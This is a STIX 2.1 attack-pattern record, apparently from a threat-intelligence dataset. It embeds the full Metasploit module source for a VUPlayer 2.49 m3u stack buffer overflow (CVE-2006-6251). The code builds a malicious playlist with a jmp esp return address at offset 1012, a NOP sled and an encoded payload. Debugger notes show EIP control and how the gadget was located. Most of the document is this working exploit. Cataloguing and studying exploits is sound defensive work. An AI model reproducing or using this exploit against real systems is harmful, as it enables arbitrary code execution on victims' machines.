{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--15eafe15-25df-4ed3-983e-1c477dd1054c",
    "created": "2024-08-14T16:35:37.683549Z",
    "modified": "2024-08-14T16:35:37.683553Z",
    "name": "VUPlayer M3U Buffer Overflow",
    "description": " This module exploits a stack over flow in VUPlayer <= 2.49. When the application is used to open a specially crafted m3u file, an buffer is overwritten allowing for the execution of arbitrary code.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/fileformat/vuplayer_m3u.rb",
            "external_id": "vuplayer_m3u.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2006-6251"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n\n  include Msf::Exploit::FILEFORMAT\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'VUPlayer M3U Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack over flow in VUPlayer <= 2.49. When\n          the application is used to open a specially crafted m3u file, an buffer is overwritten allowing\n          for the execution of arbitrary code.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         => [ 'MC' ],\n      'References'     =>\n        [\n          [ 'CVE', '2006-6251' ],\n          [ 'OSVDB', '31710' ],\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n          'DisablePayloadHandler' => true,\n          'AllowWin32SEH' => true\n        },\n      'Payload'        =>\n        {\n          'Space'    => 750,\n          'BadChars' => \"\\x00\",\n          'EncoderType'   => Msf::Encoder::Type::AlphanumUpper,\n          'DisableNops'  =>  'True',\n        },\n      'Platform' => 'win',\n      'Targets'        =>\n        [\n          [ 'VUPlayer 2.49', { 'Ret' => 0x1010539f } ],\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2009-08-18',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptString.new('FILENAME',   [ false, 'The file name.',  'msf.m3u']),\n      ])\n  end\n\n  def exploit\n\n    m3u = rand_text_alpha_upper(2024)\n\n    m3u[1012,4]  = [target.ret].pack('V')\n    m3u[1016,12] = \"\\x90\" * 12\n    m3u[1028,payload.encoded.length] = payload.encoded\n\n    print_status(\"Creating '#{datastore['FILENAME']}' file ...\")\n\n    file_create(m3u)\n\n  end\n\nend\n=begin\n0:000> r eip\neip=68423768\n0:000> !pattern_offset 2024\n[Byakugan] Control of ecx at offset 996.\n[Byakugan] Control of ebp at offset 1008.\n[Byakugan] Control of eip at offset 1012.\n0:000> d esp\n0012ef44  39684238 42306942 69423169 33694232  8Bh9Bi0Bi1Bi2Bi3\n0012ef54  42346942 69423569 37694236 42386942  Bi4Bi5Bi6Bi7Bi8B\n0012ef64  6a423969 316a4230 42326a42 6a42336a  i9Bj0Bj1Bj2Bj3Bj\n0012ef74  356a4234 42366a42 6a42376a 396a4238  4Bj5Bj6Bj7Bj8Bj9\n0012ef84  42306b42 6b42316b 336b4232 42346b42  Bk0Bk1Bk2Bk3Bk4B\n0012ef94  6b42356b 376b4236 42386b42 6c42396b  k5Bk6Bk7Bk8Bk9Bl\n0:000> s -b 0x10100000 0x1010a000 ff e4\n1010539f  ff e4 49 10 10 20 05 93-19 01 00 00 00 9c 53 10  ..I.. ........S.\n0:000> u 0x1010539f L1\nBASSWMA!BASSplugin+0xe9a:\n1010539f ffe4            jmp     esp\n=end\n",
    "x_mitre_disclosure_date": "2009-08-18",
    "x_mitre_platforms": [
        "win'"
    ]
}